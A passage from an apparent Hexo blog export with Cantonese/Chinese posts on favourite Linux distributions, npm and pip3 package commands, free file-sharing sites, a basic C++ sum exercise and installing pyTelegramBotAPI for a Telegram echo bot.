<p>Kali Linux 有大約 600 個滲透測試程序（工具），包括 Armitage（圖形化網絡攻擊管理工具）、Nmap（端口掃描器）、Wireshark（數據包分析器）、metasploit（滲透測試框架）、John the Ripper（密碼破解器）、sqlmap（自動 SQL 注入和數據庫接管工具）、Aircrack-ng（用於無線局域網滲透測試的軟件套件）、Burp 套件和 OWASP ZAP Web 應用程序安全掃描器等.</p>
<p>它是由 Offensive Security 的 Mati Aharoni 和 Devon Kearns 通過重寫 BackTrack 開發的。<br>BackTrack 是他們之前基於 Knoppix 的信息安全測試 Linux 發行版。<br>最初，它的設計重點是內核審計，因此它得名 Kernel Auditing Linux，這個名字有時被錯誤地認為來自印度教女神卡利，第三位核心開發人員 Raphaël Hertzog 作為 Debian 專家加入了他們。</p>
<p>Kali Linux 基於 Debian 測試分支，Kali 使用的大多數軟件包都是從 Debian 存儲庫導入的。</p>
<p>Kali Linux 在電視連續劇《Mr.Robot》的多集中出現時，其受歡迎程度不斷提高，節目中突出顯示並由 Kali Linux 提供的工具包括 :<br>Bluesniff、Bluetooth Scanner (btscanner)、John the Ripper、Metasploit Framework、Nmap、Shellshock 和 Wget。</p>
<img src="/2021/12/23/my-top-Linux-distro/Kalii.png" class="">

<h1 id="2-Parrot-Linux"><a href="#2-Parrot-Linux" class="headerlink" title="2. Parrot Linux"></a>2. Parrot Linux</h1><p>Parrot OS 是一個基於 Debian 的 Linux 發行版，專注於安全、隱私和開發。 </p>
<p>Parrot OS 在提供易於使用的界面和工具方面更好，初學者可以輕鬆掌握。</p>
<p>Parrot OS 和 Kali Linux 一樣，都是一個用於滲透測試而設計的系統。</p>
<img src="/2021/12/23/my-top-Linux-distro/Parrot.png" class="">

<h1 id="3-Ubuntu-Linux"><a href="#3-Ubuntu-Linux" class="headerlink" title="3. Ubuntu Linux"></a>3. Ubuntu Linux</h1><p>Ubuntu 是一個基於 Debian 的 Linux 發行版，主要由免費和開源軟件組成。<br>Ubuntu 正式發布了三個版本：Desktop、Server、和 Core 用於物聯網設備和機器人，所有版本都可以單獨在計算機上運行，也可以在虛擬機中運行，Ubuntu 是一種流行的雲計算操作系統，支持 OpenStack，17.10 版以來，Ubuntu 的默認桌面一直是 GNOME。</p>
<p>Ubuntu 每六個月發布一次，每兩年發布一次長期支持 (LTS)，截至 2021 年 4 月 22 日，最新的長期支持版本是 20.04（”Focal Fossa”），在公共支持下支持到 2025 年，作為公司的付費選項和註冊的個人免費支持到 2030 年。最新的標準版本是 21.10（”Impish Indri”），支持九個月。</p>
<p>Ubuntu 是由英國公司 Canonical 和其他開發人員社區在精英治理模式下開發的，Canonical 為每個 Ubuntu 版本提供安全更新和支持，從發布日期開始，直到發布達到其指定的生命週期結束 (EOL) 日期，Canonical 通過銷售與 Ubuntu 相關的高級服務以及下載 Ubuntu 軟件的人的捐贈來產生收入。</p>
<p>Ubuntu 以 ubuntu 的 Nguni 哲學命名，Canonical 表示這意味著 “對他人的人性”，其內涵是 “我之所以是我，是因為我們都是誰”</p>
<img src="/2021/12/23/my-top-Linux-distro/Ubuntu.png" class="">

<h1 id="4-Debian-Linux"><a href="#4-Debian-Linux" class="headerlink" title="4. Debian Linux"></a>4. Debian Linux</h1><p>Debian 也稱為 Debian GNU/Linux，是由自由和開源軟件組成的 GNU/Linux 發行版，由社區支持的 Debian 項目開發。<br>Debian 的第一個版本 (0.01) 於 1993 年 9 月 15 日發布，其第一個穩定版本 (1.1) 於 1996 年 6 月 17 日發布。<br>Debian Stable 分支是最流行的個人計算機和服務器版本。<br>Debian 也是許多其他發行版的基礎，最著名的是 Ubuntu。<br>Debian 是基於 Linux 內核的最古老的操作系統之一。該項目由 Debian 項目負責人和三個基本文件：Debian 社會契約、Debian 憲法和 Debian 自由軟件指南指導的志願者團隊通過 Internet 協調。新的發行版不斷更新，下一個候選版本在基於時間的凍結後發布。<br>自成立以來，Debian 一直按照 GNU 計劃的原則進行公開開發和免費分發，正因為如此，自由軟件基金會從 1994 年 11 月到 1995 年 11 月贊助了該項目。當贊助結束時，Debian 項目成立了非營利組織 Software in the Public Interest，以繼續為開發提供財政支持。</p>
<img src="/2021/12/23/my-top-Linux-distro/Debian.png" class="">

<h1 id="5-Manjaro-Linux"><a href="#5-Manjaro-Linux" class="headerlink" title="5. Manjaro Linux"></a>5. Manjaro Linux</h1><p>Manjaro 是一個基於 Arch Linux 操作系統的免費開源 Linux 發行版。 Manjaro 專注於用戶友好性和可訪問性，並且系統本身旨在通過其各種預裝軟件完全 “開箱即用”，它具有滾動發布更新模型，並使用 Pacman 作為其包管理器，Manjaro 主要在奧地利、法國和德國開發。</p>
<img src="/2021/12/23/my-top-Linux-distro/manjaro.png" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>NPM -  裝 / 刪除 Package</title>
    <url>/2022/02/03/npm-install-uninstall-package/</url>
    <content><![CDATA[<h1 id="Uninstalling-local-packages"><a href="#Uninstalling-local-packages" class="headerlink" title="Uninstalling local packages"></a>Uninstalling local packages</h1><h2 id="Unscoped-package"><a href="#Unscoped-package" class="headerlink" title="Unscoped package"></a>Unscoped package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall &lt;package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Scoped-package"><a href="#Scoped-package" class="headerlink" title="Scoped package"></a>Scoped package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall &lt;@scope/package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall lodash</span><br></pre></td></tr></table></figure>

<h1 id="Uninstalling-global-packages"><a href="#Uninstalling-global-packages" class="headerlink" title="Uninstalling global packages"></a>Uninstalling global packages</h1><ul>
<li>respectively just more -g</li>
</ul>
<h2 id="Unscoped-package-1"><a href="#Unscoped-package-1" class="headerlink" title="Unscoped package"></a>Unscoped package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall -g &lt;package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Scoped-package-1"><a href="#Scoped-package-1" class="headerlink" title="Scoped package"></a>Scoped package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall -g &lt;@scope/package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall -g jshint</span><br></pre></td></tr></table></figure>

<h3 id="Confirming-local-package-uninstallation"><a href="#Confirming-local-package-uninstallation" class="headerlink" title="Confirming local package uninstallation"></a>Confirming local package uninstallation</h3><p>To confirm that npm uninstall worked correctly,<br>check that the node_modules directory no longer contains a directory for the uninstalled package(s).</p>
<ul>
<li>Unix system (such as OSX): ls node_modules</li>
<li>Windows systems: dir node_modules</li>
</ul>
<h1 id="Installing-local-packages"><a href="#Installing-local-packages" class="headerlink" title="Installing local packages"></a>Installing local packages</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install &lt;package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Scoped-package-2"><a href="#Scoped-package-2" class="headerlink" title="Scoped package"></a>Scoped package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install &lt;@scope/package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install lodash</span><br></pre></td></tr></table></figure>

<h2 id="for-tgz-files"><a href="#for-tgz-files" class="headerlink" title="for tgz files"></a>for <code>tgz</code> files</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install ./package.tgz</span><br></pre></td></tr></table></figure>

<h1 id="Installing-global-packages"><a href="#Installing-global-packages" class="headerlink" title="Installing global packages"></a>Installing global packages</h1><ul>
<li>respectively just more -g</li>
</ul>
<h2 id="Unscoped-package-2"><a href="#Unscoped-package-2" class="headerlink" title="Unscoped package"></a>Unscoped package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g &lt;package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Scoped-package-3"><a href="#Scoped-package-3" class="headerlink" title="Scoped package"></a>Scoped package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g &lt;@scope/package_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g jshint</span><br></pre></td></tr></table></figure>

<h2 id="for-tgz-files-1"><a href="#for-tgz-files-1" class="headerlink" title="for tgz files"></a>for <code>tgz</code> files</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g ./package.tgz</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.npmjs.com/uninstalling-packages-and-dependencies">https://docs.npmjs.com/uninstalling-packages-and-dependencies</a><br><a href="https://nodejs.dev/learn/uninstalling-npm-packages">https://nodejs.dev/learn/uninstalling-npm-packages</a><br><a href="https://docs.npmjs.com/cli/v6/commands/npm-install">https://docs.npmjs.com/cli/v6/commands/npm-install</a></p>
]]></content>
      <categories>
        <category>NPM</category>
      </categories>
      <tags>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>NPM - NodeJS Package Manager</title>
    <url>/2021/12/11/npm-list/</url>
    <content><![CDATA[<img src="/img/Post/image/npm/cover.svg" width="500px"/>

<h1 id="NPM-基本指令"><a href="#NPM-基本指令" class="headerlink" title="NPM 基本指令"></a>NPM 基本指令</h1><p>下列是基本常用指令。</p>
<ul>
<li>刪除套件</li>
<li>列出已下載套件</li>
<li>升級套件</li>
</ul>
<h1 id="列出已下載的套件"><a href="#列出已下載的套件" class="headerlink" title="列出已下載的套件"></a>列出已下載的套件</h1><p>呢邊既三個方法只係個顯示出黎既方式唔一樣。</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong><span style="font-size:larger;">方法一</span></strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm ls</span><br></pre></td></tr></table></figure>

<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong><span style="font-size:larger;">方法二</span></strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm la</span><br></pre></td></tr></table></figure>

<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><strong><span style="font-size:larger;">方法三</span></strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm ll</span><br></pre></td></tr></table></figure>

<h1 id="升級套件"><a href="#升級套件" class="headerlink" title="升級套件"></a>升級套件</h1><p>升級套件我會講兩種 :</p>
<ul>
<li>指定升級特定套件</li>
<li>全部套件升級</li>
</ul>
<h2 id="升級全部套件"><a href="#升級全部套件" class="headerlink" title="升級全部套件"></a>升級全部套件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm update -g</span><br></pre></td></tr></table></figure>

<h2 id="升級指定套件"><a href="#升級指定套件" class="headerlink" title="升級指定套件"></a>升級指定套件</h2><p>你需要指名個套件名係咩先得，打返上面講左既 <code>列出套件名單</code> 睇下你想要邊個再打返個名落去就得。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm update -g [package_name]</span><br></pre></td></tr></table></figure>

<h1 id="刪除套件"><a href="#刪除套件" class="headerlink" title="刪除套件"></a>刪除套件</h1><p>刪除套件我會講二種 :</p>
<ul>
<li>指定刪除特定套件</li>
<li>使用刪除套件刪除套件</li>
</ul>
<h2 id="使用刪除套件刪除套件"><a href="#使用刪除套件刪除套件" class="headerlink" title="使用刪除套件刪除套件"></a>使用刪除套件刪除套件</h2><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a><strong><span style="font-size:larger;">方法一</span></strong></h3><p>最基本既刪 Package 方法。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall [package_name]</span><br></pre></td></tr></table></figure>

<h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a><strong><span style="font-size:larger;">方法二</span></strong></h3><p>呢個方法可以係話等於</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt purge [package_name] -y</span><br></pre></td></tr></table></figure>

<div class="note info flat">
    NPM 用法：
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm prune [package_name] #刪除套件</span><br></pre></td></tr></table></figure>

<h3 id="方法三-1"><a href="#方法三-1" class="headerlink" title="方法三"></a><strong><span style="font-size:larger;">方法三</span></strong></h3><p>呢個方法係相等於用緊 UNIX 既 :</p>
<div class="note info flat">
    The UNIX command rm -rf for node.
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf</span><br></pre></td></tr></table></figure>

<h4 id="安裝-Rimraf"><a href="#安裝-Rimraf" class="headerlink" title="安裝 Rimraf"></a>安裝 Rimraf</h4><p>使用 <a href="https://www.npmjs.com/package/rimraf">Rimraf</a> 刪除套件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install rimraf -g #安裝 rimraf</span><br></pre></td></tr></table></figure>

<h4 id="使用-Rimraf"><a href="#使用-Rimraf" class="headerlink" title="使用 Rimraf"></a>使用 Rimraf</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rimraf node_modules #相等於 Unix rm -rf node_modules</span><br></pre></td></tr></table></figure>

<p>More Info : <a href="https://stackoverflow.com/questions/21122342/how-to-clean-node-modules-folder-of-packages-that-are-not-in-package-json">Remove package</a></p>
]]></content>
      <categories>
        <category>Package Manager</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>NPM - 更新</title>
    <url>/2022/02/03/npm-update/</url>
    <content><![CDATA[<h1 id="Updating-Globally-Installed-Packages"><a href="#Updating-Globally-Installed-Packages" class="headerlink" title="Updating Globally-Installed Packages"></a>Updating Globally-Installed Packages</h1><p>npm update -g will apply the update action to each globally installed package that is outdated – that is, has a version that is different from wanted.</p>
<p>Note: Globally installed packages are treated as if they are installed with a caret semver range specified. So if you require to update to latest you may need to run npm install -g [<pkg>…]</p>
<p>NOTE: If a package has been upgraded to a version newer than latest, it will be downgraded.</p>
<p><b>So,just type</b></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm update -g</span><br></pre></td></tr></table></figure>

<p>Done.</p>
<p><a href="https://docs.npmjs.com/cli/v8/commands/npm-update">https://docs.npmjs.com/cli/v8/commands/npm-update</a></p>
]]></content>
      <categories>
        <category>NPM</category>
      </categories>
      <tags>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>免費網站線上檔案分享平台</title>
    <url>/2022/01/09/online-File-sharing-site/</url>
    <content><![CDATA[<h1 id="1-GoFile"><a href="#1-GoFile" class="headerlink" title="1. GoFile"></a>1. <a href="https://gofile.io/">GoFile</a></h1><img src="/2022/01/09/online-File-sharing-site/gofile.png" class="">

<p><a href="https://gofile.io/">GoFile</a> 是一個完全免費的檔案分享平台，支援所有格式，圖片、音樂、影片都行，檔案會上傳到他們的伺服器，無論上傳還是下載，你都能獲得最高速度，也具備 TLS1.2+、SHA256 和 RSA-4096 加密技術。<br>無需登入就能使用，不過如果你想要能控管檔案（刪除之類），輸入 E-mail 即可。</p>
<img src="/2022/01/09/online-File-sharing-site/gofile-2.png" class="">

<h1 id="2-Sendspace"><a href="#2-Sendspace" class="headerlink" title="2. Sendspace"></a>2. <a href="https://www.sendspace.com/">Sendspace</a></h1><img src="/2022/01/09/online-File-sharing-site/sendspace.png" class="">

<p><a href="https://www.sendspace.com/">SendSpace</a> 是來自美國一個老牌穩定免費的網絡硬盤。無需註冊，無限雲存儲空間，沒有下載限制，支持多文件上傳，單個文件上傳限制500M/註冊用戶1G！上傳的文件如果30天內無人下載Sendspace會進行刪除。免費註冊成為普通用戶，用戶可以管理自己上傳的文件，可以賺取Points積分來換取高級會員，可以享受更多服務！</p>
<img src="/2022/01/09/online-File-sharing-site/sendspace-2.png" class="">


<h1 id="3-Mediafire"><a href="#3-Mediafire" class="headerlink" title="3. Mediafire"></a>3. <a href="https://www.mediafire.com/">Mediafire</a></h1><img src="/2022/01/09/online-File-sharing-site/mediafire.svg" class="">

<p><a href="https://www.mediafire.com/">Mediafire</a> 是一個非常優秀的免費空間，它提供了免費使用者無限大的使用空間，但仍然是有單檔大小200MB的限制。而這個免費的空間在下載時的速度也還算快，而且不用讀秒倒數，也沒有難以理解的辨識碼，是一個還算適合分享檔案的空間。</p>
<ul>
<li>空間大小：無限制</li>
<li>上傳大小：單檔200MB</li>
<li>流量大小：無限制</li>
<li>檔案類型：無限制</li>
</ul>
<img src="/2022/01/09/online-File-sharing-site/mediafire-2.png" class="">

<h1 id="4-upload-ee"><a href="#4-upload-ee" class="headerlink" title="4. upload.ee"></a>4. <a href="https://www.upload.ee/">upload.ee</a></h1><img src="/2022/01/09/online-File-sharing-site/uploadee.png" class="">

<p><a href="https://www.upload.ee/">UPLOAD.EE</a></p>
<p>Uploaded files info:</p>
<ul>
<li>Maximum filesize 100 megabytes (MB)</li>
<li>Waiting time 0 seconds</li>
<li>Maximum download speed</li>
<li>Anonymous files expire 50 days and registered users’ files expire 120 after last download</li>
<li>Uploading of up to 3 simultaneous files for logged in users</li>
<li>All most used file extensions are supported</li>
</ul>
<img src="/2022/01/09/online-File-sharing-site/uploadeee.png" class="">

<h1 id="5-sendanywhere"><a href="#5-sendanywhere" class="headerlink" title="5. sendanywhere"></a>5. <a href="https://send-anywhere.com/">sendanywhere</a></h1><img src="/2022/01/09/online-File-sharing-site/ss.png" class="">

<p><a href="https://send-anywhere.com/">sendanywhere</a> 是一個非常方便又安全的免費上傳空間平台，上傳檔案方面是無上限，然後上傳後的檔案要由對方在網站上輸入 <code>Receive key</code> 才可以下載，下載完一次就會失效，這種方法有助於只需下載一次檔案的人，而作耆是韓國人。</p>
<img src="/2022/01/09/online-File-sharing-site/snw.png" class="">

]]></content>
      <categories>
        <category>網站介紹</category>
      </categories>
  </entry>
  <entry>
    <title>python3 - pip3 移除 Module</title>
    <url>/2022/01/30/pip3-uninstall-module/</url>
    <content><![CDATA[<h1 id="del"><a href="#del" class="headerlink" title="del"></a>del</h1><p>Just type</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 uninstall module_name</span><br></pre></td></tr></table></figure>

<p>Done.</p>
]]></content>
      <categories>
        <category>三修系統大撚哂</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>pip3</tag>
      </tags>
  </entry>
  <entry>
    <title>python3 - 更新 pip3 到最新版本</title>
    <url>/2022/01/30/pip3-update/</url>
    <content><![CDATA[<img alt="pip3" src="python.png" width="200px"/>

<h2 id="–user-指令取得權限更新-Windows"><a href="#–user-指令取得權限更新-Windows" class="headerlink" title="–user 指令取得權限更新 (Windows)"></a>–user 指令取得權限更新 (Windows)</h2><p>有時候會需要使用權限才能更新，使用以下參數 :</p>
<ul>
<li><code>--user</code></li>
</ul>
<h3 id="Windows-系統"><a href="#Windows-系統" class="headerlink" title="Windows 系統"></a>Windows 系統</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip install --user --upgrade pip</span><br></pre></td></tr></table></figure>

<p>呢個唔得既話可以打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>

<h2 id="Linux-系統"><a href="#Linux-系統" class="headerlink" title="Linux 系統"></a>Linux 系統</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>

<h2 id="Module-update"><a href="#Module-update" class="headerlink" title="Module update"></a>Module update</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip --user --upgrade module_name</span><br></pre></td></tr></table></figure>

<h2 id="Non-user-更新"><a href="#Non-user-更新" class="headerlink" title="Non -user 更新"></a>Non -user 更新</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://blog.e-happy.com.tw/python-%E5%A6%82%E4%BD%95%E6%9B%B4%E6%96%B0-pip-%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%EF%BC%9F/">https://blog.e-happy.com.tw/python-%E5%A6%82%E4%BD%95%E6%9B%B4%E6%96%B0-pip-%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%EF%BC%9F/</a><br><a href="https://www.itread01.com/content/1549617303.html">https://www.itread01.com/content/1549617303.html</a></p>
]]></content>
      <categories>
        <category>三修系統大撚哂</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>pip3</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 基礎練習 - 找出 10 個數字相加的總和</title>
    <url>/2022/07/08/programming-cpp-Basic-practice-The-sum-of-first-10-natural-numbers/</url>
    <content><![CDATA[<h1 id="程式概念是怎樣？"><a href="#程式概念是怎樣？" class="headerlink" title="程式概念是怎樣？"></a>程式概念是怎樣？</h1><p>只要明白最基本的 C++ forloop 概念的話，要完成這個練習並不難，<br>只需要在 for loop 內宣告多一個 int 數字，讓他儲存你指定的數字即可，做法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum = <span class="number">0</span>; <span class="comment">//宣告兩個整數變數，i是列出頭10個數字，sum是列出數字的總和</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n\n Find the first 10 natural numbers:\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;---------------------------------------\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; The natural numbers are: \n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++) <span class="comment">//初始值 i 為一，每當 i 大過 10的時候，將 i + 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 列出目前數字</span></span><br><span class="line">        sum = sum + i; <span class="comment">// 將 sum 目前數字加上上面 i 的數字，然後每次加的時候都是將自身的數再加 i</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n The sum of first 10 natural numbers: &quot;</span> &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>輸出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// output:</span><br><span class="line"></span><br><span class="line">Find the first 10 natural numbers:</span><br><span class="line">---------------------------------------</span><br><span class="line">The natural numbers are: </span><br><span class="line">1 2 3 4 5 6 7 8 9 10 </span><br><span class="line">The sum of first 10 natural numbers: 55</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Cpp 基礎練習</tag>
        <tag>Cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>Telegram Bot - pyTelegramBotAPI | No module named &#39;telebot.storage&#39;</title>
    <url>/2022/01/27/python-pyTelegramBotAPI-ModuleNotFoundError-No-module-named-telebot-storage/</url>
    <content><![CDATA[<h1 id="點解？"><a href="#點解？" class="headerlink" title="點解？"></a>點解？</h1><p>你係咪用左 git 黎 install？</p>
<p>然後 Run <code>python3 main.py</code><br>出現咁既野？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/main.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    import telebot</span><br><span class="line">  File &quot;&lt;frozen zipimport&gt;&quot;, line 259, in load_module</span><br><span class="line">  File &quot;/usr/local/lib/python3.9/dist-packages/pyTelegramBotAPI-4.4.0-py3.9.egg/telebot/__init__.py&quot;, line 17, in &lt;module&gt;</span><br><span class="line">ModuleNotFoundError: No module named &#x27;telebot.storage&#x27;</span><br></pre></td></tr></table></figure>

<p>然後你又想試下用 pip3 裝又話已經存在，裝唔到？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@hi:/home# pip3 install pyTelegramBotAPI</span><br><span class="line">Requirement already satisfied: pyTelegramBotAPI in /usr/local/lib/python3.9/dist-packages/pyTelegramBotAPI-4.4.0-py3.9.egg (4.4.0)</span><br><span class="line">Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from pyTelegramBotAPI) (2.25.1)</span><br></pre></td></tr></table></figure>

<p>要解決呢個問題我地需要重新安裝 <code>pyTelegramBotAPI</code></p>
<p>首先我地要 del 走佢個 <code>egg</code> 檔</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm -rf /usr/local/lib/python3.9/dist-packages/pyTelegramBotAPI-4.4.0-py3.9.egg</span><br></pre></td></tr></table></figure>

<p>然後再行多次</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install pyTelegramBotAPI</span><br></pre></td></tr></table></figure>
<p>咁就得啦！</p>
<p>完成。</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>Python</tag>
        <tag>Telegram</tag>
      </tags>
  </entry>
  <entry>
    <title>Telegram Bot - Python 安裝 pyTelegramBotAPI</title>
    <url>/2022/01/09/python-pyTelegramBotAPI-install/</url>
    <content><![CDATA[<h1 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h1><p><a href="https://github.com/eternnoir/pyTelegramBotAPI">pyTelegramBotAPI</a> is A simple, but extensible Python implementation for the Telegram Bot API.</p>
<p>開始之前，你部機係需要安裝</p>
<ul>
<li><a href="https://www.python.org/">python</a></li>
<li>python pip3</li>
</ul>
<h1 id="安裝-python-pip3"><a href="#安裝-python-pip3" class="headerlink" title="安裝 python pip3"></a>安裝 python pip3</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure>

<p>裝完之後打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@gwx:~# pip3 --version</span><br><span class="line">pip 20.3.4 from /usr/lib/python3/dist-packages/pip (python 3.9)</span><br></pre></td></tr></table></figure>

<p>確保係成功左之後就可以繼續以下既操作.</p>
<h1 id="安裝-pyTelegramBotAPI"><a href="#安裝-pyTelegramBotAPI" class="headerlink" title="安裝 pyTelegramBotAPI"></a>安裝 pyTelegramBotAPI</h1><p>使用 pip3 安裝 pyTelegramBotAPI</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pip install pyTelegramBotAPI</span></span><br></pre></td></tr></table></figure>

<h1 id="升級-pyTelegramBotAPI"><a href="#升級-pyTelegramBotAPI" class="headerlink" title="升級 pyTelegramBotAPI"></a>升級 pyTelegramBotAPI</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install pytelegrambotapi --upgrade</span><br></pre></td></tr></table></figure>

<h1 id="try-your-first-bot"><a href="#try-your-first-bot" class="headerlink" title="try your first bot"></a>try your first bot</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> telebot</span><br><span class="line"></span><br><span class="line">API_TOKEN = <span class="string">&#x27;&lt;api_token&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">bot = telebot.TeleBot(API_TOKEN)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle &#x27;/start&#x27; and &#x27;/help&#x27;</span></span><br><span class="line"><span class="meta">@bot.message_handler(<span class="params">commands=[<span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;start&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_welcome</span>(<span class="params">message</span>):</span></span><br><span class="line">    bot.reply_to(message, <span class="string">&quot;呢度你係需要 打 /help 或者 /start 佢先會有反應 然後佢就會 Print 呢段野入黎.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle all other messages with content_type &#x27;text&#x27; (content_types defaults to [&#x27;text&#x27;])</span></span><br><span class="line"><span class="meta">@bot.message_handler(<span class="params">func=<span class="keyword">lambda</span> message: <span class="literal">True</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo_message</span>(<span class="params">message</span>):</span></span><br><span class="line">    bot.reply_to(message, message.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bot.infinity_polling()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>Python</tag>
        <tag>Telegram</tag>
      </tags>
  </entry>
  <entry>
    <title>Telegram Bot - pyTelegramBotAPI send_chat_action()</title>
